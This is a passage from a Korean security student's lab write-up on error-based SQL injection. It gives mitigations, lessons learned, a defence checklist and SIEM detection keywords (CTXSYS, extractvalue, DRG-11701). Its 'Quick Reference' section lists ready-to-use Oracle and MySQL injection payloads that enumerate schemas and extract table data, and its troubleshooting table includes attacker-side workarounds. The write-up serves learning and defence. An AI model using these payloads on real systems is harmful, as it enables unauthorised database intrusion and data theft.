error_reporting = E_ALL & ~E_NOTICE & ~E_WARNING
# 에러는 로그에만 기록, 사용자에게는 일반 메시지만 표시

# 2. Oracle 시스템 스키마 함수 권한 제거
# CTXSYS, ORDSYS 등 시스템 스키마 함수 실행 권한 제거
REVOKE EXECUTE ON CTXSYS.DRITHSX FROM webapp_user;
REVOKE EXECUTE ON ORDSYS.ORD_DICOM FROM webapp_user;

# 3. MySQL 함수 사용 제한 (가능한 경우)
# extractvalue, updatexml 함수 사용 제한
# MySQL은 함수별 권한 제어가 어려우므로 애플리케이션 레벨 방어 필수

# 4. 에러 메시지 일반화
try:
    result = db.execute(query)
except Exception as e:
    # 상세 에러는 로그에만 기록
    logger.error(f"DB Error: {type(e).__name__}: {str(e)}")
    # 사용자에게는 일반 메시지만 표시
    return "처리 중 오류가 발생했습니다.", 500

# 5. WAF 룰 활성화
# Error-based SQL Injection 패턴 탐지 룰 적용
# 실시간 차단 및 알림 설정

# 6. Rate Limiting 강화
# 동일 IP의 반복적인 에러 발생 차단
# 5분 내 10회 이상 에러 발생 시 IP 차단
```

---

## 6. 배운 점 및 인사이트

### 새로 알게 된 점

- **Error-based SQL Injection의 효율성:** Union-based가 불가능한 환경에서도 에러 메시지만 노출되면 데이터를 추출할 수 있다는 점이 인상 깊었습니다. 특히 CTXSYS.DRITHSX.SN과 extractvalue 같은 DBMS별 고유 함수를 악용하는 방식이 매우 창의적이라고 느꼈습니다.
- **LISTAGG 함수의 실전 활용:** Oracle의 LISTAGG 함수를 사용하면 여러 행을 하나의 문자열로 결합하여 한 번에 추출할 수 있어, 반복 횟수를 크게 줄일 수 있다는 점을 배웠습니다. 이는 탐지 회피와 공격 효율성 측면에서 매우 유용합니다.
- **extractvalue의 32자 제한:** MySQL의 extractvalue 함수는 에러 메시지가 32자까지만 출력된다는 제약이 있어, 긴 데이터는 substring으로 분할해야 한다는 점을 알게 되었습니다.
- **ROWNUM vs LIMIT 차이:** Oracle은 ROWNUM을 사용하고 MySQL은 LIMIT를 사용하여 순차 추출한다는 점에서 DBMS별 문법 차이를 다시 한번 확인했습니다.
- **에러 메시지 노출의 심각성:** 개발 환경의 상세 에러 메시지 설정이 운영 환경에 그대로 적용되면 전체 DB 구조와 데이터가 완전히 노출될 수 있다는 점을 실습을 통해 체감했습니다.

### 이전 학습과의 연결고리

- **Day 63 Union-based & Blind SQL Injection과 비교:** Union-based는 빠르지만 쿼리 결과가 화면에 출력되어야 하고, Blind는 느리지만 참/거짓 차이만 있으면 되며, Error-based는 중간 속도지만 에러 메시지가 노출되어야 한다는 각 기법의 장단점과 적용 환경을 명확히 이해했습니다.
- **SIEM 로그 분석 확장:** Error-based 공격은 CTXSYS, extractvalue 같은 특정 키워드와 DRG-11701, XPATH syntax error 같은 에러 패턴으로 탐지할 수 있다는 점을 배워, SIEM 탐지 룰 작성에 활용할 수 있겠습니다.
- **침해사고 대응 시나리오 구체화:** Error-based SQL Injection 탐지 시 즉시 세션 차단, 시스템 스키마 함수 권한 확인, 에러 메시지 노출 설정 점검 등의 초기 대응 절차를 수립할 수 있었습니다.

### 실무 적용 아이디어

**보안 전문가 관점:**
- **SIEM 탐지 룰 고도화:** CTXSYS, DRITHSX, extractvalue 키워드 탐지뿐만 아니라 ROWNUM 순차 증가, LIMIT 순차 증가 패턴을 탐지하는 룰을 추가하여 Error-based SQL Injection 초기 단계에서 차단할 수 있겠습니다.
- **에러 메시지 감사 프로세스:** 운영 환경의 모든 웹 애플리케이션에 대해 에러 메시지 노출 여부를 점검하고, 상세 에러가 노출되는 경우 즉시 일반화된 에러 페이지로 변경하는 프로세스를 수립해야겠습니다.
- **DB 권한 최소화 점검:** 웹 애플리케이션 DB 계정이 CTXSYS, ORDSYS 같은 시스템 스키마 함수를 실행할 수 있는 권한이 있는지 전수 조사하고, 불필요한 권한은 즉시 제거해야겠습니다.

**보안 컨설턴트 관점:**
- **고객사 진단 시 Error-based 점검 강화:** 기존에는 Union-based와 Blind SQL Injection 위주로 점검했다면, 이제는 에러 메시지 노출 여부를 확인하고 Error-based SQL Injection 테스트도 필수로 포함해야겠습니다.
- **개발자 교육 자료 개선:** Prepared Statement 사용법뿐만 아니라 에러 처리 best practice (로그에만 기록, 사용자에게는 일반 메시지 표시)도 함께 교육해야겠습니다.

---

## 7. Quick Reference

### Error-based SQL Injection 공격 명령어 모음

```sql
# Oracle Error-based SQL Injection

# 기본 테스트
김%' and CTXSYS.DRITHSX.SN(user,'hacker') ='j

# 현재 사용자 확인
김%' and CTXSYS.DRITHSX.SN(user,(select user from dual)) ='j

# 테이블 개수 확인
김%' and CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables)) ='j

# 테이블명 순차 추출
김%' and CTXSYS.DRITHSX.SN(user,(select j from (select table_name j, rownum k from user_tables) where k = 1)) ='j

# 컬럼명 순차 추출
김%' and CTXSYS.DRITHSX.SN(user,(select c from (select column_name c, rownum r from user_tab_columns where table_name='테이블명') where r = 1)) ='j

# LISTAGG로 모든 컬럼명 한 번에 추출
김%' and CTXSYS.DRITHSX.SN(user,(select LISTAGG(column_name, ', ') WITHIN GROUP (ORDER BY 1) from user_tab_columns where table_name = '테이블명')) ='j

# 데이터 추출
김%' and CTXSYS.DRITHSX.SN(user,(select 컬럼명 from (select 컬럼명, rownum r from 테이블명) where r = 1)) ='j

# CONCAT으로 여러 컬럼 한 번에 추출
김%' and CTXSYS.DRITHSX.SN(user,(select concat(컬럼1,',', 컬럼2,',', 컬럼3) from 테이블명 where rownum=1)) ='j
```

```sql
# MySQL Error-based SQL Injection

# 기본 테스트
test%' and extractvalue(1, concat(0x3a, (select 'hacker'))) and '1'='1

# 현재 사용자 확인
test%' and extractvalue(1, concat(0x3a, (select user()))) and '1'='1

# 테이블 개수 확인
test%' and extractvalue(1, concat(0x3a, (select count(table_name) from information_schema.tables where table_schema=database()))) and '1'='1

# 테이블명 순차 추출
test%' and extractvalue(1, concat(0x3a, (select table_name from information_schema.tables where table_schema=database() limit 0,1))) and '1'='1

# 컬럼명 순차 추출
test%' and extractvalue(1, concat(0x3a, (select column_name from information_schema.columns where table_name='테이블명' limit 0,1))) and '1'='1

# 데이터 추출
test%' and extractvalue(1, concat(0x3a, (select 컬럼명 from 테이블명 limit 0,1))) and '1'='1

# updatexml 함수 (extractvalue 차단 시)
test%' and updatexml(1, concat(0x3a, (select user())), 1) and '1'='1

# 긴 데이터 분할 추출 (32자 제한)
test%' and extractvalue(1, concat(0x3a, (select substring(컬럼명, 1, 30) from 테이블명 limit 0,1))) and '1'='1
test%' and extractvalue(1, concat(0x3a, (select substring(컬럼명, 31, 30) from 테이블명 limit 0,1))) and '1'='1
```

### DBMS별 핵심 함수 요약표

| 구분 | Oracle | MySQL | 용도 |
|:---:|:---|:---|:---|
| **에러 함수** | CTXSYS.DRITHSX.SN | extractvalue, updatexml | 에러 메시지에 서브쿼리 결과 포함 |
| **문자열 결합** | CONCAT, `||` | CONCAT, `||` (8.0+) | 여러 컬럼을 하나로 합침 |
| **행 결합** | LISTAGG | GROUP_CONCAT | 여러 행을 하나의 문자열로 |
| **순차 추출** | ROWNUM | LIMIT | 한 번에 하나씩 추출 |
| **문자열 분할** | SUBSTR | SUBSTRING | 긴 데이터 분할 |

### Error-based SQL Injection 방어 체크리스트

**개발 단계:**
- [ ] 모든 사용자 입력값에 Prepared Statement 적용
- [ ] 에러 처리 코드 작성 (try-catch)
- [ ] 상세 에러는 로그에만 기록, 사용자에게는 일반 메시지 표시
- [ ] 개발/운영 환경 에러 메시지 설정 분리

**인프라 단계:**
- [ ] Oracle: CTXSYS, ORDSYS 스키마 함수 실행 권한 제거
- [ ] MySQL: extractvalue, updatexml 함수 사용 제한 (가능한 경우)
- [ ] WAF 룰셋 적용 (Error-based 패턴 탐지)
- [ ] IPS/IDS 시그니처 업데이트

**운영 단계:**
- [ ] 에러 메시지 노출 여부 정기 점검
- [ ] SIEM에서 Error-based SQL Injection 탐지 룰 생성
- [ ] DRG-11701, XPATH syntax error 반복 발생 시 알림
- [ ] Rate Limiting으로 반복 시도 차단
- [ ] 침해사고 대응 매뉴얼에 Error-based 대응 절차 포함

---

## 8. 트러블슈팅

| 문제 | 원인 | 해결 방법 |
|:---|:---|:---|
| CTXSYS.DRITHSX.SN 함수 실행 시 권한 에러 | 웹 애플리케이션 계정에 CTXSYS 스키마 실행 권한 없음 | - 이는 정상적인 보안 설정<br>- 공격자 입장에서는 다른 에러 함수 시도<br>- 방어자 입장에서는 권한 제거 유지 |
| extractvalue 결과가 32자까지만 출력됨 | MySQL extractvalue 함수의 에러 메시지 길이 제한 | - substring 함수로 데이터 분할<br>- substring(data, 1, 30), substring(data, 31, 30), ...<br>- 또는 Union-based나 Blind로 전환 |
| 서브쿼리 실행 시 ORA-01427 에러 | 다중 행 반환 (1 Row 제약 위반) | - WHERE ROWNUM=1 추가하여 단일 행만 반환<br>- 또는 순차 추출 (WHERE r=1, r=2, ...) |
| LISTAGG 결과가 잘림 | 문자열 길이 제한 (4000자) | - 컬럼이 너무 많은 경우 순차 추출로 전환<br>- 또는 여러 번 나눠서 추출 |
| 에러 메시지가 전혀 노출되지 않음 | 운영 환경의 올바른 에러 처리 | - Error-based 공격 불가능<br>- Union-based 또는 Blind SQL Injection으로 전환<br>- 다른 입력란에서 시도 |

---

**Today's Insight:**

Error-based SQL Injection은 Union-based와 Blind SQL Injection의 중간 형태로, 에러 메시지만 상세하게 노출되면 효과적으로 데이터를 추출할 수 있는 강력한 공격 기법입니다. Oracle의 CTXSYS.DRITHSX.SN과 MySQL의 extractvalue처럼 DBMS별 고유 함수를 악용하는 방식이 매우 창의적이며, 특히 LISTAGG 함수를 활용하면 반복 횟수를 크게 줄여 탐지 회피 가능성을 높일 수 있다는 점이 인상 깊었습니다. 보안 전문가로서 가장 중요한 교훈은 '에러 메시지를 사용자에게 절대 상세히 노출해서는 안 된다'는 점과, '시스템 스키마 함수 실행 권한을 웹 애플리케이션 계정에서 제거해야 한다'는 점입니다. 개발 환경의 상세 에러 메시지 설정이 운영 환경에 그대로 적용되는 실수는 치명적인 보안 취약점으로 이어질 수 있으므로, 배포 전 에러 처리 설정을 반드시 점검하는 프로세스를 수립해야겠습니다. 앞으로 SIEM에서 CTXSYS, extractvalue 같은 키워드와 DRG-11701, XPATH syntax error 같은 에러 패턴을 탐지하는 룰을 작성하여 Error-based SQL Injection을 초기 단계에서 차단할 수 있도록 하겠습니다.